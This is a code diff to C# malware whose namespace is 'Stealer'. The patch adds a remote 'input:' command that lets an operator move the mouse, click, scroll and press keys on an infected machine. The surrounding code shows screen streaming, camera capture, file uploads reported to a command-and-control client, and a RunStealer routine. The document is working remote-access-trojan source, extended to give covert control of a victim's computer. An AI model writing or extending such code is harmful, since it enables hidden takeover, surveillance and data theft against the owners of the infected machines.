@@ -101,6 +101,10 @@ namespace Stealer
             {
                 ScreenStream.Stop();
             }
+            else if (cmdLower.StartsWith("input:"))
+            {
+                HandleInput(cmd.Substring(6));
+            }
             else if (cmdLower.StartsWith("camera_start"))
             {
                 int fps = 5;
@@ -986,6 +990,44 @@ namespace Stealer
                     C2Client.SendText("{\"type\":\"fm_upload_res\",\"path\":\"" + pathEsc + "\",\"success\":false,\"error\":\"" + errEsc + "\"}");
                 }
             });
+        }
+
+        private static void HandleInput(string payload)
+        {
+            try
+            {
+                int semi = payload.IndexOf('|');
+                string cmd = semi >= 0 ? payload.Substring(0, semi) : payload;
+                string args = semi >= 0 ? payload.Substring(semi + 1) : "";
+                string[] p = args.Split(',');
+                switch (cmd)
+                {
+                    case "move":
+                        if (p.Length >= 2 && double.TryParse(p[0], NumberStyles.Any, CultureInfo.InvariantCulture, out double mx)
+                                          && double.TryParse(p[1], NumberStyles.Any, CultureInfo.InvariantCulture, out double my))
+                            InputController.MoveTo(mx, my);
+                        break;
+                    case "mousedown":
+                        if (p.Length >= 1) InputController.MouseDown(p[0]);
+                        break;
+                    case "mouseup":
+                        if (p.Length >= 1) InputController.MouseUp(p[0]);
+                        break;
+                    case "click":
+                        if (p.Length >= 1) InputController.Click(p[0], p.Length > 1 && p[1] == "1");
+                        break;
+                    case "scroll":
+                        if (p.Length >= 1 && int.TryParse(p[0], out int sd)) InputController.ScrollDelta(sd);
+                        break;
+                    case "kdown":
+                        if (p.Length >= 1 && byte.TryParse(p[0], out byte vkd)) InputController.KeyDown(vkd);
+                        break;
+                    case "kup":
+                        if (p.Length >= 1 && byte.TryParse(p[0], out byte vku)) InputController.KeyUp(vku);
+                        break;
+                }
+            }
+            catch { }
         }
 
         private static void RunStealer()
